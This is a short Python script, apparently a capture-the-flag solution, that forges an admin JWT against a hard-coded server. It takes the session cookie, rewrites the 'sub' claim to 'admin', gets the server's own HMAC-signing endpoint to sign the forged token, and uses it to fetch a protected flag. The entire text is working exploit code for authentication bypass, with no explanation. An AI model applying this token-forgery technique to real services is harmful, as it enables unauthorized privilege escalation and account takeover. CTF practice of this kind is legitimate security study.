import base64
import json
import requests as r
r1 = r.get('http://34.148.103.218:4829/login')

val = r1.cookies.get('access_token_cookie')
val = str(val).split('.')

jwt_payload = base64.b64decode(val[1] + '==').decode('utf-8')
jwt_payload = json.loads(jwt_payload)
jwt_payload['sub'] = 'admin'
jwt_payload = json.dumps(jwt_payload)
jwt_payload = base64.b64encode(bytes(jwt_payload,'utf-8')).decode('utf-8').replace('=','')


payload = {"message":val[0] + '.' + jwt_payload}
r1 = r.post('http://34.148.103.218:4829/api/sign-hmac',data=payload)
token = val[0] + '.' + jwt_payload + '.' + r1.text.replace('=','')


headers = {
    "Cookie":f"access_token_cookie={token}"
}
r1 = r.get('http://34.148.103.218:4829/flag',headers=headers)

print(r1.text)
